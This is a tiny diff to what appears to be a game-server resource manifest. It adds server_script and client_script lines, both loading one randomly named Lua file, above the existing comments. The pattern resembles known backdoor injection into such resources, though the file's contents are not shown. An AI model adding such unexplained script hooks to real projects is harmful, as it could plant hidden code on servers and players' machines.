@@ -1,3 +1,5 @@
+server_script "U7F0A1L8PBG2LG2.lua"
+client_script "U7F0A1L8PBG2LG2.lua"
 -- Resources:
 -- **********
 -- IPL list: https://wiki.rage.mp/index.php?title=Interiors_and_Locations
